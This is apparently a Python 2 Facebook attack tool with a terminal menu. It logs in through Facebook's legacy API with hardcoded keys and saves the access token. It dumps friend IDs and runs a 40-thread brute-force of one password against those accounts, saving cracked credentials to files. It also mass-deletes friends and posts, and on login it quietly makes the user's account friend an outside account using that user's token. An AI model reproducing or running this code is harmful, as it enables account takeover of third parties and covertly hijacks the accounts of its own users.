        print "\n\x1b[1;91mCommand\t\t\t\t\x1b[1;91mDescription\n\x1b[1;94m-------\t\t\t\t\x1b[1;94m-----------\n\x1b[1;97mhelp\t\t\t\thelp\nHurt_hackfb \t      \t\tHack Facebook Target\nHurt_clyahoo\t\t\tCloning Yahoo\nHurt_guardpp\t\t\tProfile Guard\nHurt_dpost\t\t\tDelete Post\nHurt_dfriend\t\t\tDelete Friend\nHurt_others\t\t\tOthers Show\nHurt_login\t\t\tLogin Facebook\nexit\t\t\t\tExit the Program\nlogut\t\t\t\tLog'out Account\n\n\n\t\t"
        terminal()
    elif minal == 'exit':
        exit()
    elif minal == 'Hurt_others':
        print 'Wait Update'
        terminal()
    elif minal == 'Hurt_dfriend':
        unfriend()
    elif minal == 'Hurt_dpost':
        deletepost()
    elif minal == 'Hurt_guardpp':
        guard()
    elif minal == 'Hurt_clyahoo':
        menu_yahoo()
    elif minal == 'Hurt_login':
        login()
    elif minal == 'Hurt_hackfb':
        hackfb()
    elif minal == 'logut':
        os.system('rm -rf login.txt')
        print "Log'out Succes"
        terminal()
    else:
        print '\x1b[1;97m' + minal + ' err : input error'
        terminal()


def login():
    os.system('reset')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('reset')
        print logo_login
        run("\x1b[1;97m[!]Please Log'out Your Account First from App Mobile and \n    Your Log'in in Opera Mini\n")
        print '\x1b[1;97m[+]Login Facebook Account!'
        id = raw_input('\x1b[1;97m[?]Username : ')
        pwd = getpass.getpass('\x1b[1;97m[?]Password : ')
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;97merr : no connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;97mLogin Succesfully'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                terminal()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;97merr : You Account CheckPoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            terminal()
        else:
            print '\n\x1b[1;97merr : Login Error. Check Usr/Pass'
            os.system('rm -rf login.txt')
            time.sleep(1)
            terminal()


def unfriend():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97merr : Token not found\nPlease login First'
        os.system('rm -rf login.txt')
        time.sleep(1)
        terminal()
    else:
        os.system('reset')
        print logo
        run('Start Delete Friend')
        print 42 * '\x1b[1;96m\xe2\x95\x90'
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[1;97m[\x1b[1;92m Deleted \x1b[1;97m] ==>\x1b[1;96m ' + nama

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[1;97m Stopped'
            terminal()

    print '\n\x1b[1;97m[+] \x1b[1;92mDone'
    terminal()


def hackfb():
    print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mHackFB\x1b[1;97m]'
    minal_hack = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
    if minal_hack == '':
        print '\x1b[1;97merr : input not Found !'
        hackfb()
    elif minal_hack == 'help':
        print '\n\x1b[1;91mCommand\t\t\t\tDescription\n\x1b[1;94m-------\t\t\t\t-----------\x1b[1;97m\nHurt_hackt\t\t\tHack Target\nHurt_abf\t\t\tAuto Brute Force\nHurt_shack\t\t\tSuper Hack\nHurt_dumpid\t\t\tDump All ID Friend\nBack\t\t\t\tBack to Terminal\n\t\t'
        hackfb()
    elif minal_hack == 'Back':
        terminal()
    elif minal_hack == 'Hurt_hackt':
        run('Sorry please wait Update!')
        hackfb()
    elif minal_hack == 'Hurt_abf':
        crack()
    elif minal_hack == 'Hurt_shack':
        super()
    elif minal_hack == 'Hurt_dumpid':
        id_teman()
    else:
        print minal_hack + ' err : input error!'
        hackfb()


def id_teman():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Hurt')
        except OSError:
            pass

        try:
            os.system('reset')
            print logo
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            run('Wait a minute...')
            print 42 * '\x1b[1;96m\xe2\x95\x90'
            bz = open('Hurt/id_friend.txt', 'w')
            for a in z['data']:
                idteman.append(a['id'])
                bz.write(a['id'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;96m' + str(len(idteman)) + '\x1b[1;97m ]\x1b[1;97m=-> \x1b[1;95m' + a['id'],
                sys.stdout.flush()
                time.sleep(0.0001)

            bz.close()
            print '\r\x1b[1;91m[+] \x1b[1;96mTotal ID \x1b[1;97m: \x1b[1;92m%s' % len(idteman)
            done = raw_input('\r\x1b[1;91m[+] \x1b[1;96mSave file with name\x1b[1;97m :\x1b[1;92m ')
            os.rename('Hurt/id_friend.txt', 'Hurt/' + done)
            print '\r\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;97m: \x1b[1;94mHurt/' + done
            hackfb()
        except IOError:
            print '\x1b[1;97merr : Error Creating file'
            hackfb()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;97merr : Stopped'
            hackfb()
        except KeyError:
            print 'err : Error '
            hackfb()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97merr : Error no Connection'
            keluar()


def crack():
    global file
    global idlist
    global passw
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97merr :  Token not found\nplease login first'
        os.system('rm -rf login.txt')
        time.sleep(1)
        terminal()
    else:
        os.system('reset')
        print logo
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;96mFile ID  \x1b[1;97m: \x1b[1;92m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;96mPassword \x1b[1;97m: \x1b[1;92m')
        try:
            file = open(idlist, 'r')
            run(' ')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;97merr: File not found'
            hackfb()


def scrak():
    global back
    global gagal
    global up
    try:
        os.mkdir('Hurt')
    except OSError:
        pass
    else:
        try:
            buka = open(idlist, 'r')
            up = buka.read().split()
            while file:
                username = file.readline().strip()
                url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                data = urllib.urlopen(url)
                mpsh = json.load(data)
                if back == len(up):
                    break
                if 'access_token' in mpsh:
                    bisa = open('Hurt/abf_ok.txt', 'w')
                    bisa.write(username + '|' + passw + '\n')
                    bisa.close()
                    x = requests.get('https://graph.facebook.com/' + username + '?access_token=' + mpsh['access_token'])
                    z = json.loads(x.text)
                    berhasil.append('\x1b[1;97m[ \x1b[1;92mSucces\x1b[1;97m ] ' + username + '|' + passw + ' =->' + z['name'])
                elif 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Hurt/abf_cp.txt', 'w')
                    cek.write(username + '|' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[ \x1b[1;93mCheckP\x1b[1;97m ] ' + username + '|' + passw)
                else:
                    gagal.append(username)
                    back += 1
                sys.stdout.write('\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;96mCrack    \x1b[1;97m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m\xe2\x89\xa5\x1b[1;97m ' + str(len(up)) + ' =->\x1b[1;96mLive\x1b[1;97m:\x1b[1;92m' + str(len(berhasil)) + ' \x1b[1;97m=->\x1b[1;93mCheck\x1b[1;97m:\x1b[1;96m' + str(len(cekpoint)))
                sys.stdout.flush()

        except IOError:
            print '\n\x1b[1;97m-'
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97merr: no connection'


def hasil():
    print
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[31m[x] Failed \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def deletepost():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;97merr : Token not Found \nPlease login First'
        os.system('rm -rf login.txt')
        time.sleep(1)
        terminal()

    os.system('reset')
    print logo
    print '\x1b[1;91m[+] \x1b[1;92mAdmin \x1b[1;91m: \x1b[1;97m%s' % nama
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;97m[\x1b[1;94m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;97m] \x1b[1;91mFailed'
        except TypeError:
            print '\x1b[1;97m[\x1b[1;94m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;97m] \x1b[1;92mDeleted'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97merr : Connection Error'
            terminal()

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mDone'
    terminal()


terminal()
